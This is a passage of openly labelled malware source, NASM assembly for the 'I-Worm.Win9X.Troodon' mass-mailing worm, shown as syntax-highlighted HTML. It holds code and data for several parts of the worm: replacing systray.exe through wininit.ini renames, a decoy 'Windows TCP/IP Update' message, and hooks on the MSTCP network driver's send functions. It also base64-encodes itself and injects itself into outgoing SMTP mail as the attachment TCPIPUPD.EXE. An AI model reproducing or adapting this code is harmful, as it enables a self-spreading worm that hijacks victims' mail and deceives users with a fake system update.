        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">systray.exe</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetSystemDirectoryA</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">systray.sys</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetSystemDirectoryA</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">systray.me</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetSystemDirectoryA</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">systray.exe_</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">systray.exe</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lstrcatA</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">systray.sys_</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">systray.sys</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lstrcatA</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">systray.me_</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">systray.me</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lstrcatA</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">





</span><span class="sc1">;beep:      pushad</span><span class="sc0">
</span><span class="sc1">;       mov ax, 1000</span><span class="sc0">
</span><span class="sc1">;       mov bx, 200</span><span class="sc0">
</span><span class="sc1">;       mov cx, ax</span><span class="sc0">
</span><span class="sc1">;       mov al, 0xB6</span><span class="sc0">
</span><span class="sc1">;       out 0x43, al</span><span class="sc0">
</span><span class="sc1">;       mov dx, 0x0012</span><span class="sc0">
</span><span class="sc1">;       mov ax, 0x34DC</span><span class="sc0">
</span><span class="sc1">;       div cx</span><span class="sc0">
</span><span class="sc1">;       out 0x42, al</span><span class="sc0">
</span><span class="sc1">;       mov al, ah</span><span class="sc0">
</span><span class="sc1">;       out 0x42, al</span><span class="sc0">
</span><span class="sc1">;       in  al, 0x61</span><span class="sc0">
</span><span class="sc1">;       mov ah, al</span><span class="sc0">
</span><span class="sc1">;       or  al, 0x03</span><span class="sc0">
</span><span class="sc1">;       out 0x61, al</span><span class="sc0">
</span><span class="sc1">;l1:        mov ecx, 4680</span><span class="sc0">
</span><span class="sc1">;l2:        loop    l2</span><span class="sc0">
</span><span class="sc1">;       dec bx</span><span class="sc0">
</span><span class="sc1">;       jnz l1</span><span class="sc0">
</span><span class="sc1">;       mov al, ah</span><span class="sc0">
</span><span class="sc1">;       out 0x61, al</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       popad</span><span class="sc0">
</span><span class="sc1">;       ret</span><span class="sc0">

</span><span class="sc4">[</span><span class="sc9">section</span><span class="sc0"> </span><span class="sc9">.data</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">my_path</span><span class="sc0">         </span><span class="sc9">times</span><span class="sc0">   </span><span class="sc2">300</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">path_len</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">300</span><span class="sc0">
</span><span class="sc5">systray.exe</span><span class="sc0">         </span><span class="sc9">times</span><span class="sc0">   </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">systray.exe_</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'\systray.exe'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">systray.sys</span><span class="sc0">         </span><span class="sc9">times</span><span class="sc0">   </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">systray.sys_</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'\systray.sys'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">systray.me</span><span class="sc0">          </span><span class="sc9">times</span><span class="sc0">   </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">systray.me_</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'\systray.me'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">wininit.ini</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'wininit.ini'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">rename</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Rename'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">systray_exe</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'SYSTRAY.EXE'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">systray_exe_len</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">11</span><span class="sc0">          </span><span class="sc1">; size of the string above</span><span class="sc0">
</span><span class="sc5">tempFileName</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'\systray.tmp'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">systray_ornot</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; 0 - "myself" isn't systray.exe :)</span><span class="sc0">
                        </span><span class="sc1">; 1 - "myself" is systray.exe :)</span><span class="sc0">

</span><span class="sc5">msgCaption</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Windows TCP/IP Update'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">msgContent</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"The system doesn't need an update."</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Latest version of TCP/IP already present.'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">hFile</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">hMap</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">pMap</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">dwFileSize</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">dwBufSize</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">encoded_addr</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">heap_enc_addr</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">encoded_size</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">encTable</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span><span class="sc0">
</span><span class="sc5">pad</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'='</span><span class="sc0">
</span><span class="sc5">pad_no</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">mailtype</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">codeaddr</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">codesize</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">TCPName</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'MSTCP'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">TdiDispatchTable</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">TdiConnect_PrevAddr</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">TdiSend_PrevAddr</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">TdiDisconnect_PrevAddr</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">TdiCloseConnection_PrevAddr</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">TraceHandle</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">NextIsMail</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sourcebuf</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">buflen</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">search_str</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'DATA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0A</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">newmailaddr</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;newmaillen         dd  0</span><span class="sc0">

</span><span class="sc5">strContentType</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Content-Type:'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">strMultipartAlternative</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'multipart/alternative'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">strMultipartMixed</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'multipart/mixed'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">strTextPlain</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'text/plain'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">strTextHtml</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'text/html'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">strApp</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'application/x-msdownload'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">mark1</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">mark2</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">myMultipartMixed</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Content-Type: multipart/mixed;'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">myBoundary</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'boundary="----This_is_created_by_VX_e-mail_service"'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">myUseBoundary</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'------This_is_created_by_VX_e-mail_service'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">myAttachHeader</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Content-Type: application/x-msdownload;'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'name="TCPIPUPD.EXE"'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Content-Transfer-Encoding: base64'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Content-Disposition: attachement;'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'filename="TCPIPUPD.EXE"'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">myEndBoundary</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'------This_is_created_by_VX_e-mail_service--'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">hWnd</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">WindowHandle</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ClassName</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'I-Worm'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">WindowTitle</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Troodon'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">x</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">step</span><span class="sc0">
</span><span class="sc5">y</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">step</span><span class="sc0">
</span><span class="sc5">rect</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">ISTRUC</span><span class="sc0"> </span><span class="sc5">RECT</span><span class="sc0">
    </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">RECT.left</span><span class="sc4">,</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">RECT.top</span><span class="sc4">,</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">RECT.right</span><span class="sc4">,</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">RECT.bottom</span><span class="sc4">,</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">IEND</span><span class="sc0">

</span><span class="sc5">WindowClassStruc</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">ISTRUC</span><span class="sc0"> </span><span class="sc5">WNDCLASS</span><span class="sc0">
    </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">WNDCLASS.style</span><span class="sc4">,</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">WNDCLASS.lpfnWndProc</span><span class="sc4">,</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc5">WndProc</span><span class="sc0">
    </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">WNDCLASS.cbClsExtra</span><span class="sc4">,</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">WNDCLASS.cbWndExtra</span><span class="sc4">,</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">WNDCLASS.hInstance</span><span class="sc4">,</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">WNDCLASS.hIcon</span><span class="sc4">,</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc5">NULL</span><span class="sc0">
    </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">WNDCLASS.hCursor</span><span class="sc4">,</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc5">NULL</span><span class="sc0">
    </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">WNDCLASS.hbrBackground</span><span class="sc4">,</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">WNDCLASS.lpszMenuName</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc5">NULL</span><span class="sc0">
    </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">WNDCLASS.lpszClassName</span><span class="sc4">,</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc5">ClassName</span><span class="sc0">
</span><span class="sc9">IEND</span><span class="sc0">

</span><span class="sc5">WindowMSG</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">ISTRUC</span><span class="sc0"> </span><span class="sc5">MSG</span><span class="sc0">
    </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">MSG.hwnd</span><span class="sc4">,</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">MSG.message</span><span class="sc4">,</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">MSG.wParam</span><span class="sc4">,</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">MSG.lParam</span><span class="sc4">,</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">MSG.time</span><span class="sc4">,</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">IEND</span><span class="sc0">

</span><span class="sc5">STime</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">ISTRUC</span><span class="sc0"> </span><span class="sc5">SYSTEMTIME</span><span class="sc0">
    </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">SYSTEMTIME.wYear</span><span class="sc4">,</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">SYSTEMTIME.wMonth</span><span class="sc4">,</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">SYSTEMTIME.wDayOfWeek</span><span class="sc4">,</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">SYSTEMTIME.wDay</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">SYSTEMTIME.wHour</span><span class="sc4">,</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">SYSTEMTIME.wMinute</span><span class="sc4">,</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">SYSTEMTIME.wSecond</span><span class="sc4">,</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">SYSTEMTIME.wMilliseconds</span><span class="sc4">,</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">IEND</span><span class="sc0">

</span><span class="sc5">copyright</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'I-Worm.Win9X.Troodon v1.0 Project'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Developed by Clau.'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc4">:</span></div></body>
</html>
